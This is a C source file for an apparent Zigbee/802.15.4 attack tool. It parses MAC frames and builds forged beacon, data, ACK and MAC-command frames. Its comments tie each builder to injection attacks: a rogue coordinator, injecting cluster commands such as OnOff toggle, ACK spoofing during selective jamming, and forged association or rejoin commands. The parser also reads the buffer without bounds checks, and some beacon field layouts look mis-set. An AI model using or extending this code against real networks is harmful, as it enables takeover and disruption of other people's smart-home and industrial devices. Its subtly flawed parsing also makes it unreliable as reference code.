/*
 * drivers/zigbee_mac.c — IEEE 802.15.4 MAC frame parser/builder
 * Author: jayis1
 * License: GPL-2.0
 *
 * Full 802.15.4-2020 frame parser with security header dissection and
 * builders for beacon, data, ACK, and MAC-command frames used in injection
 * attacks (rogue coordinator, rejoin flood, forged Transport-Key).
 */
#include "zigbee_mac.h"
#include "../board.h"
#include <string.h>

/* ---- Frame Control field bitfield layout ----
 * bits [2:0]   frame type
 * bit  3       security enabled
 * bit  4       frame pending
 * bit  5       ack request
 * bit  6       PAN ID compression
 * bits [9:7]   reserved
 * bits [11:10] dst addressing mode
 * bits [13:12] frame version
 * bits [15:14] src addressing mode
 */

static inline uint16_t rd16(const uint8_t *p) { return (uint16_t)p[0] | ((uint16_t)p[1] << 8); }
static inline uint32_t rd32(const uint8_t *p) { return (uint32_t)p[0] | ((uint32_t)p[1]<<8) | ((uint32_t)p[2]<<16) | ((uint32_t)p[3]<<24); }
static inline void wr16(uint8_t *p, uint16_t v) { p[0] = v & 0xFF; p[1] = (v >> 8) & 0xFF; }
static inline void wr32(uint8_t *p, uint32_t v) { p[0]=v&0xFF; p[1]=(v>>8)&0xFF; p[2]=(v>>16)&0xFF; p[3]=(v>>24)&0xFF; }

/* ITU-T CRC-16 / CRC-CCITT (0x1021 init 0x0000) used by 802.15.4 FCS */
uint16_t zb_mac_fcs(const uint8_t *data, uint8_t len)
{
    uint16_t crc = 0x0000;
    for (uint8_t i = 0; i < len; i++) {
        crc ^= (uint16_t)data[i] << 8;
        for (uint8_t b = 0; b < 8; b++) {
            if (crc & 0x8000)
                crc = (crc << 1) ^ 0x1021;
            else
                crc <<= 1;
        }
    }
    return crc;
}

/* Parse raw 802.15.4 frame (without FCS) into structured form.
 * Returns 0 on success, -1 on malformed. */
int zb_mac_parse(const uint8_t *buf, uint8_t len, zb_mac_frm_t *out)
{
    if (!buf || !out || len < 3) return -1;

    /* FCS is appended by the radio; we receive FCS-stripped here for parsing
     * but keep the FCS bytes for pcap export. Caller passes len = raw_len+2. */
    uint8_t plen = (len >= IEEE802154_FCS_LEN) ? (uint8_t)(len - IEEE802154_FCS_LEN) : len;
    out->raw = (uint8_t *)buf;
    out->raw_len = plen;

    /* Verify FCS if FCS present */
    if (len >= IEEE802154_FCS_LEN) {
        uint16_t calc = zb_mac_fcs(buf, plen);
        uint16_t got  = rd16(&buf[plen]);
        out->crc_ok = (calc == got);
    } else {
        out->crc_ok = false;
    }

    uint16_t fc = rd16(&buf[0]);
    out->type          = (zb_frm_type_t)(fc & 0x07);
    out->security      = (fc >> 3) & 1;
    out->frame_pending = (fc >> 4) & 1;
    out->ack_req       = (fc >> 5) & 1;
    out->pan_compress  = (fc >> 6) & 1;
    out->dst_mode      = (zb_addr_mode_t)((fc >> 10) & 0x03);
    out->src_mode      = (zb_addr_mode_t)((fc >> 14) & 0x03);

    uint8_t idx = 2;
    out->seq_num = buf[idx++];

    /* Destination addressing */
    if (out->dst_mode != ADDR_MODE_NONE) {
        out->dst_panid[0] = buf[idx]; out->dst_panid[1] = buf[idx+1]; idx += 2;
        if (out->dst_mode == ADDR_MODE_SHORT) {
            out->dst_addr[0] = buf[idx]; out->dst_addr[1] = buf[idx+1]; idx += 2;
            memset(&out->dst_addr[2], 0, 6);
        } else { /* LONG */
            memcpy(out->dst_addr, &buf[idx], 8); idx += 8;
        }
    } else {
        memset(out->dst_panid, 0, 2);
        memset(out->dst_addr, 0, 8);
    }

    /* Source addressing */
    if (out->src_mode != ADDR_MODE_NONE) {
        if (!out->pan_compress) {
            out->src_panid[0] = buf[idx]; out->src_panid[1] = buf[idx+1]; idx += 2;
        } else {
            memcpy(out->src_panid, out->dst_panid, 2);
        }
        if (out->src_mode == ADDR_MODE_SHORT) {
            out->src_addr[0] = buf[idx]; out->src_addr[1] = buf[idx+1]; idx += 2;
            memset(&out->src_addr[2], 0, 6);
        } else { /* LONG */
            memcpy(out->src_addr, &buf[idx], 8); idx += 8;
        }
    } else {
        memset(out->src_panid, 0, 2);
        memset(out->src_addr, 0, 8);
    }

    /* Security header */
    if (out->security) {
        out->sec_ctrl = buf[idx++];
        uint8_t sec_level  = out->sec_ctrl & 0x07;
        uint8_t key_id_mode = (out->sec_ctrl >> 3) & 0x03;
        out->key_id_mode = key_id_mode;
        out->frame_ctr = rd32(&buf[idx]); idx += 4;
        switch (key_id_mode) {
            case 0: break; /* no key id */
            case 1: out->key_id[0] = buf[idx++]; break;
            case 2: memcpy(out->key_id, &buf[idx], 4); idx += 4; break;
            case 3: memcpy(out->key_id, &buf[idx], 9); idx += 9; break;
        }
        (void)sec_level;
    } else {
        out->sec_ctrl = 0; out->key_id_mode = 0;
        out->frame_ctr = 0; memset(out->key_id, 0, sizeof(out->key_id));
    }

    out->payload    = (uint8_t *)&buf[idx];
    out->payload_len = (uint8_t)(plen - idx);
    return 0;
}

/* Build a frame from a structured description (no FCS appended). */
int zb_mac_build(uint8_t *out, const zb_mac_frm_t *frm)
{
    if (!out || !frm) return -1;
    uint8_t idx = 0;
    uint16_t fc = (uint16_t)(frm->type & 0x07)
                | ((frm->security ? 1:0) << 3)
                | ((frm->frame_pending ? 1:0) << 4)
                | ((frm->ack_req ? 1:0) << 5)
                | ((frm->pan_compress ? 1:0) << 6)
                | (((uint16_t)frm->dst_mode) << 10)
                | (((uint16_t)frm->src_mode) << 14);
    wr16(&out[idx], fc); idx += 2;
    out[idx++] = frm->seq_num;
    if (frm->dst_mode != ADDR_MODE_NONE) {
        out[idx++] = frm->dst_panid[0]; out[idx++] = frm->dst_panid[1];
        if (frm->dst_mode == ADDR_MODE_SHORT) { out[idx++] = frm->dst_addr[0]; out[idx++] = frm->dst_addr[1]; }
        else { memcpy(&out[idx], frm->dst_addr, 8); idx += 8; }
    }
    if (frm->src_mode != ADDR_MODE_NONE) {
        if (!frm->pan_compress) { out[idx++] = frm->src_panid[0]; out[idx++] = frm->src_panid[1]; }
        if (frm->src_mode == ADDR_MODE_SHORT) { out[idx++] = frm->src_addr[0]; out[idx++] = frm->src_addr[1]; }
        else { memcpy(&out[idx], frm->src_addr, 8); idx += 8; }
    }
    if (frm->payload_len && frm->payload) {
        memcpy(&out[idx], frm->payload, frm->payload_len);
        idx += frm->payload_len;
    }
    /* Append FCS */
    uint16_t fcs = zb_mac_fcs(out, idx);
    out[idx++] = fcs & 0xFF; out[idx++] = (fcs >> 8) & 0xFF;
    return idx;
}

bool zb_mac_match_pan(const zb_mac_frm_t *frm, uint16_t panid)
{
    if (panid == 0xFFFF) return true;
    return (rd16(frm->dst_panid) == panid) || (rd16(frm->src_panid) == panid);
}

bool zb_mac_match_src_eui(const zb_mac_frm_t *frm, const uint8_t eui[8])
{
    if (eui[0]==0 && eui[1]==0 && eui[2]==0 && eui[3]==0 &&
        eui[4]==0 && eui[5]==0 && eui[6]==0 && eui[7]==0) return true;
    if (frm->src_mode != ADDR_MODE_LONG) return false;
    return memcmp(frm->src_addr, eui, 8) == 0;
}

/* ---- Frame builders for injection ---- */

/* Build a Zigbee NWK Beacon (MAC beacon frame) carrying a superframe spec
 * and GTS/Pending fields, plus a Zigbee beacon payload advertising the
 * spoofed PAN, router/end-device capacity, protocol version and stack
 * profile. Used by the rogue-coordinator attack. */
int zb_mac_build_beacon(uint8_t *out, uint16_t panid,
                        const uint8_t *ext_panid, uint8_t chan,
                        bool router_cap, bool enddev_cap,
                        uint8_t protocol_ver, uint8_t stack_profile)
{
    uint8_t idx = 0;
    /* Frame Control: beacon type, no sec, no ack, long src addr, no dst */
    uint16_t fc = (uint16_t)FRM_TYPE_BEACON
                | (((uint16_t)ADDR_MODE_NONE) << 10)
                | (((uint16_t)ADDR_MODE_LONG) << 14);
    wr16(&out[idx], fc); idx += 2;
    out[idx++] = 0x00; /* seq num — beacon has BSN, often ignored */
    /* Source PAN + EUI (the coordinator's spoofed EUI) */
    out[idx++] = (panid) & 0xFF; out[idx++] = (panid >> 8) & 0xFF;
    /* Spoofed long source address — derived from ext_panid for determinism */
    for (int i = 0; i < 8; i++) out[idx++] = ext_panid[i];
    /* Superframe spec: SO=0, BO=15 (always on), PAN coord=1, */
    uint16_t super = 0xFF00;  /* BO=15, SO=0, final cap slot, no GTS */
    super |= (1u << 4);        /* PAN coordinator bit */
    super |= (router_cap ? (1u << 1) : 0); /* router capacity */
    super |= (enddev_cap ? (1u << 2) : 0); /* end-device capacity */
    wr16(&out[idx], super); idx += 2;
    /* GTS fields: permit=0, slot count=0 */
    out[idx++] = 0x00;
    /* Pending address fields: none */
    out[idx++] = 0x00;
    /* ---- Zigbee beacon payload ---- */
    /* Protocol ID = 0 (Zigbee), Protocol Version = protocol_ver (2=Pro) */
    out[idx++] = protocol_ver & 0x0F;
    /* Stack profile (lower nibble) + ...: stack_profile in low nibble */
    out[idx++] = stack_profile & 0x0F;
    /* Beacon router/end-device capacity (Zigbee NWK layer) */
    uint8_t nwk_cap = 0;
    if (router_cap)  nwk_cap |= 0x01;  /* router capacity */
    if (enddev_cap) nwk_cap |= 0x02;  /* end-device capacity */
    out[idx++] = nwk_cap;
    /* Extended PAN ID */
    for (int i = 0; i < 8; i++) out[idx++] = ext_panid[i];
    /* Tx offset (2 bytes) — set to match chan center freq */
    uint16_t txoff = (uint16_t)(IEEE802154_CHAN_OF(chan) & 0xFFFF);
    wr16(&out[idx], txoff); idx += 2;
    /* Update ID */
    out[idx++] = 0x00;
    /* FCS */
    uint16_t fcs = zb_mac_fcs(out, idx);
    out[idx++] = fcs & 0xFF; out[idx++] = (fcs >> 8) & 0xFF;
    (void)enddev_cap;
    return idx;
}

/* Build a data frame for cluster-command injection (e.g., ZCL OnOff Toggle). */
int zb_mac_build_data(uint8_t *out, uint16_t dst_pan, uint16_t dst_short,
                      uint16_t src_pan, uint16_t src_short,
                      uint8_t seq, const uint8_t *payload, uint8_t plen,
                      bool sec, bool ack_req)
{
    uint8_t idx = 0;
    uint16_t fc = (uint16_t)FRM_TYPE_DATA
                | ((sec ? 1:0) << 3)
                | ((ack_req ? 1:0) << 5)
                | ((src_pan == dst_pan) ? (1u << 6) : 0)  /* PAN compress */
                | (((uint16_t)ADDR_MODE_SHORT) << 10)
                | (((uint16_t)ADDR_MODE_SHORT) << 14);
    wr16(&out[idx], fc); idx += 2;
    out[idx++] = seq;
    out[idx++] = dst_pan & 0xFF; out[idx++] = (dst_pan >> 8) & 0xFF;
    out[idx++] = dst_short & 0xFF; out[idx++] = (dst_short >> 8) & 0xFF;
    if (src_pan != dst_pan) { out[idx++] = src_pan & 0xFF; out[idx++] = (src_pan >> 8) & 0xFF; }
    out[idx++] = src_short & 0xFF; out[idx++] = (src_short >> 8) & 0xFF;
    if (sec) {
        /* Minimal security header placeholder; NWK security handled at APS layer */
        out[idx++] = 0x05; /* sec level = ENC_MIC_32, key id mode 0 */
        wr32(&out[idx], 0x00000001); idx += 4; /* frame ctr */
        /* key source + key id omitted (mode 0) */
    }
    if (plen && payload) { memcpy(&out[idx], payload, plen); idx += plen; }
    uint16_t fcs = zb_mac_fcs(out, idx);
    out[idx++] = fcs & 0xFF; out[idx++] = (fcs >> 8) & 0xFF;
    return idx;
}

/* Build an immediate ACK (used in selective-jam ACK-spoof attacks). */
int zb_mac_build_ack(uint8_t *out, uint8_t seq)
{
    uint16_t fc = (uint16_t)FRM_TYPE_ACK;
    wr16(&out[0], fc);
    out[2] = seq;
    uint16_t fcs = zb_mac_fcs(out, 3);
    out[3] = fcs & 0xFF; out[4] = (fcs >> 8) & 0xFF;
    return 5;
}

/* Build a MAC command frame (used for forged association / orphan / rejoin). */
int zb_mac_build_cmd(uint8_t *out, uint16_t dst_pan, uint16_t dst_short,
                     uint16_t src_pan, uint16_t src_short,
                     uint8_t seq, uint8_t cmd_id,
                     const uint8_t *cmd_payload, uint8_t cmd_plen)
{
    uint8_t idx = 0;
    uint16_t fc = (uint16_t)FRM_TYPE_CMD
                | (1u << 5)   /* ack req */
                | (((uint16_t)ADDR_MODE_SHORT) << 10)
                | (((uint16_t)ADDR_MODE_SHORT) << 14);
    wr16(&out[idx], fc); idx += 2;
    out[idx++] = seq;
    out[idx++] = dst_pan & 0xFF; out[idx++] = (dst_pan >> 8) & 0xFF;
    out[idx++] = dst_short & 0xFF; out[idx++] = (dst_short >> 8) & 0xFF;
    out[idx++] = src_pan & 0xFF; out[idx++] = (src_pan >> 8) & 0xFF;
    out[idx++] = src_short & 0xFF; out[idx++] = (src_short >> 8) & 0xFF;
    out[idx++] = cmd_id;
    if (cmd_plen && cmd_payload) { memcpy(&out[idx], cmd_payload, cmd_plen); idx += cmd_plen; }
    uint16_t fcs = zb_mac_fcs(out, idx);
    out[idx++] = fcs & 0xFF; out[idx++] = (fcs >> 8) & 0xFF;
    return idx;
}